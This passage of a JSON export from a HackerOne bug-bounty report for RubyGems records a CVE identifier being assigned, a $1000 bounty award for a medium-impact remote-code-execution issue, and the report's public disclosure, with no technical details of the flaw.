            "id": 1967704,
            "is_internal": false,
            "editable": false,
            "type": "Activities::CveIdAdded",
            "message": "",
            "automated_response": false,
            "created_at": "2017-08-30T23:32:01.667Z",
            "updated_at": "2017-08-30T23:32:01.667Z",
            "cve_ids": [
                "CVE-2017-0902"
            ],
            "actor": {
                "username": "indirect",
                "cleared": false,
                "verified": false,
                "url": "/indirect",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        },
        {
            "id": 1967709,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BountyAwarded",
            "message": "Thank you for your report! Based on the [guidelines posted on the RubyGems HackerOne project](https://hackerone.com/rubygems), this report is considered medium impact: allows remote code execution, but does not guarantee it. Therefore, we are awarding a bounty of $1000.",
            "automated_response": false,
            "created_at": "2017-08-30T23:35:57.719Z",
            "updated_at": "2017-08-30T23:35:57.719Z",
            "actor": {
                "url": "/rubygems",
                "ibb": true,
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "profile": {
                    "name": "RubyGems"
                }
            },
            "bounty_currency": "usd",
            "genius_execution_id": null,
            "team_handle": "rubygems",
            "collaborator": {
                "username": "claudijd",
                "url": "/claudijd"
            }
        },
        {
            "id": 1967710,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ManuallyDisclosed",
            "message": "Disclosing, as requested by reporter.",
            "automated_response": false,
            "created_at": "2017-08-30T23:36:42.952Z",
            "updated_at": "2017-08-30T23:36:42.952Z",
            "actor": {
                "username": "indirect",
                "cleared": false,
                "verified": false,
                "url": "/indirect",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/097/577/4bb4cd3c39360f43b5fd7df0ae2f35e514826e42_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rubygems"
        }
    ],
    "activity_page_count": 1,
    "activity_page_number": 1,
    "summaries": [
        {
            "category": "team",
            "can_view?": true,
            "can_create?": false
        },
        {
            "category": "researcher",
            "can_view?": true,
            "can_create?": false
        }
    ]
}